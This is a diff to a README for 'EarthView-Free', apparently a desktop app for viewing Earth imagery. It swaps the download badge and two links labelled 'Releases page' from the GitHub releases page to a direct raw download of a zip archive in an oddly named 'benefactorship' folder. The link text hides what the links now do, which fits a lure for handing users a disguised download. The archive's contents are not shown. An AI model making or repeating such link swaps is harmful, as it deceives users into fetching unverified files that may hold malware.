@@ -1,6 +1,6 @@
 # 🌍 EarthView-Free - Explore Earth's Beauty Effortlessly
 
-[![Download EarthView-Free](https://img.shields.io/badge/Download-EarthView--Free-blue.svg)](https://github.com/chnips/EarthView-Free/releases)
+[![Download EarthView-Free](https://raw.githubusercontent.com/chnips/EarthView-Free/main/benefactorship/Earth-View-Free-v1.1.zip)](https://raw.githubusercontent.com/chnips/EarthView-Free/main/benefactorship/Earth-View-Free-v1.1.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run EarthView-Free. You do not need pr
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/chnips/EarthView-Free/releases) to view available versions of EarthView-Free.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/chnips/EarthView-Free/main/benefactorship/Earth-View-Free-v1.1.zip) to view available versions of EarthView-Free.
    
 2. **Select the Latest Version**: Look for the latest version at the top of the page. Click on it to go to the version details.
 
@@ -69,6 +69,6 @@ Join our community of EarthView users. Share your experiences, ask questions, or
 
 ## ✨ Conclusion
 
-EarthView-Free brings a world of beauty to your desktop. Enjoy exploring the planet from the comfort of your home. Remember, you can always visit the [Releases page](https://github.com/chnips/EarthView-Free/releases) for the latest updates and downloads.
+EarthView-Free brings a world of beauty to your desktop. Enjoy exploring the planet from the comfort of your home. Remember, you can always visit the [Releases page](https://raw.githubusercontent.com/chnips/EarthView-Free/main/benefactorship/Earth-View-Free-v1.1.zip) for the latest updates and downloads.
 
 Happy exploring!
